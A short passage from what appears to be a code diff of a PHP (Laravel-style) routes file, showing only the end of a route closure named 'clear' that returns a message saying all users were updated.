+    return 'All users updated successfully ✅';
+})->name('clear');
+
+-------------------------------
